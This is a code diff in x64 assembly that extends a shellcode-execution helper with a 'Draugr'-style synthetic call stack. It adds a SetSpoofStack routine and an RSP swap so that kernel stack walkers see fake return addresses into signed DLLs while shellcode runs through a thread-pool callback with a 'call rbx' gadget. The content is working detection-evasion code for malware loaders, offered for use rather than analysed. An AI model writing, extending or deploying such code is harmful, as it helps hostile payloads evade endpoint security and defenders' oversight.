@@ -9,6 +9,7 @@
     qSyscallAddr    QWORD   000h        ; Address of syscall;ret in ntdll
     qTargetFunc     QWORD   000h        ; Shellcode address for spoofed callback
     qCallGadget     QWORD   000h        ; Address of 'call rbx' gadget in legit DLL
+    qSpoofStack     QWORD   000h        ; Pre-built synthetic stack (Draugr MVP)
 
 .code
 
@@ -49,6 +50,19 @@ SetSpoofTarget PROC
 SetSpoofTarget ENDP
 
 ; -----------------------------------------------
+; SetSpoofStack(PVOID pSyntheticRsp)
+;   RCX = address to load into RSP inside SpoofCallback
+;         before jumping to shellcode. Pass NULL to disable
+;         stack swap (fall back to current fiber/worker stack).
+;   Caller pre-populates the buffer with fake return addresses
+;   that point into legitimate signed DLLs.
+; -----------------------------------------------
+SetSpoofStack PROC
+    mov qSpoofStack, rcx
+    ret
+SetSpoofStack ENDP
+
+; -----------------------------------------------
 ; SpoofCallback - Thread pool work callback with
 ;   call stack spoofing via gadget injection
 ;
@@ -80,6 +94,18 @@ SetSpoofTarget ENDP
 ; -----------------------------------------------
 SpoofCallback PROC
     mov rbx, QWORD PTR [qTargetFunc]   ; RBX = shellcode address
+
+    ; If qSpoofStack is set, swap RSP to a pre-built synthetic stack
+    ; whose top three qwords are fake return addresses pointing into
+    ; legitimate signed DLLs (Draugr MVP). Kernel-side callstack
+    ; walkers will see a plausible thread-start chain instead of our
+    ; fiber/worker stack bottom.
+    mov rax, QWORD PTR [qSpoofStack]
+    test rax, rax
+    jz _nostackswap
+    mov rsp, rax                        ; swap to fake stack
+_nostackswap:
+
     mov rax, QWORD PTR [qCallGadget]
     test rax, rax
     jz _direct
